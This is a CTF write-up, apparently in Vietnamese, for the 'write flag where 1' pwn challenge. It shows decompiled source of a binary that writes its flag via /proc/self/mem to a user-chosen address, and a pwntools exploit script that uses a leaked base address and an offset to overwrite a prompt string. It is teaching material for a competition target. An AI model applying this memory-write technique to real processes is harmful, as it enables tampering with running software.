# write flag where 1

## source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf[9]; // [rsp+0h] [rbp-70h] BYREF
  _DWORD n[3]; // [rsp+4Ch] [rbp-24h] BYREF
  int v6; // [rsp+58h] [rbp-18h]
  int v7; // [rsp+5Ch] [rbp-14h]
  int v8; // [rsp+60h] [rbp-10h]
  int v9; // [rsp+64h] [rbp-Ch]
  int v10; // [rsp+68h] [rbp-8h]
  int fd; // [rsp+6Ch] [rbp-4h]

  fd = open("/proc/self/maps", 0, envp);
  read(fd, maps, 0x1000uLL);
  close(fd);
  v10 = open("./flag.txt", 0);
  if ( v10 == -1 )
  {
    puts("flag.txt not found");
    return 1;
  }
  else
  {
    if ( read(v10, &flag, 0x80uLL) > 0 )
    {
      close(v10);
      v9 = dup2(1, 1337);
      v8 = open("/dev/null", 2);
      dup2(v8, 0);
      dup2(v8, 1);
      dup2(v8, 2);
      close(v8);
      alarm(0x3Cu);
      dprintf(
        v9,
        "This challenge is not a classical pwn\n"
        "In order to solve it will take skills of your own\n"
        "An excellent primitive you get for free\n"
        "Choose an address and I will write what I see\n"
        "But the author is cursed or perhaps it's just out of spite\n"
        "For the flag that you seek is the thing you will write\n"
        "ASLR isn't the challenge so I'll tell you what\n"
        "I'll give you my mappings so that you'll have a shot.\n");
      dprintf(v9, "%s\n\n", maps);
      while ( 1 )
      {
        dprintf(
          v9,
          "Give me an address and a length just so:\n"
          "<address> <length>\n"
          "And I'll write it wherever you want it to go.\n"
          "If an exit is all that you desire\n"
          "Send me nothing and I will happily expire\n");
        memset(buf, 0, 64);
        v7 = read(v9, buf, 64uLL);
        if ( (unsigned int)__isoc99_sscanf(buf, "0x%llx %u", &n[1], n) != 2 || n[0] > 0x7Fu )
          break;
        v6 = open("/proc/self/mem", 2);
        lseek64(v6, *(__off64_t *)&n[1], 0);
        write(v6, &flag, n[0]);
        close(v6);
      }
      exit(0);
    }
    puts("flag.txt empty");
    return 1;
  }
}
```

## Ý tưởng

- chương trình có chức năng in ra các vùng địa chỉ và sử dụng `/proc/self/mem` để có thể ghi đè ở bất cứ đâu dù không có quyền write

```c
if ( (unsigned int)__isoc99_sscanf(buf, "0x%llx %u", &n[1], n) != 2 || n[0] > 0x7Fu )
    break;
v6 = open("/proc/self/mem", 2);
lseek64(v6, *(__off64_t *)&n[1], 0);
write(v6, &flag, n[0]);
close(v6);
```

- Vậy chương trình sẽ ghi flag vào bất cứ đâu ta muốn
- ta chú ý ở vòng `while()`, nó sẽ luôn in ra một đoạn `Give me a address...`. Đó sẽ là mục tiêu, ta sẽ ghi đè `Give me a address...` thành flag
## Khai thác
- Bằng gdb ta tìm được offset của chuỗi `Give me a address`

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('wfw1.2023.ctfcompetition.com', 1337)
else:
        p = process(exe.path)

GDB()
offset_give_me = 8672
p.recvlines(9)
exe_base = int("0x" + p.recv(12).decode(), 16)
info("exe base: " + hex(exe_base))
sla(b"expire", hex(exe_base + offset_give_me) + " " + str(100))
p.interactive()
```

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/a0b58fde-93ab-45a8-aa03-2382028459c5)
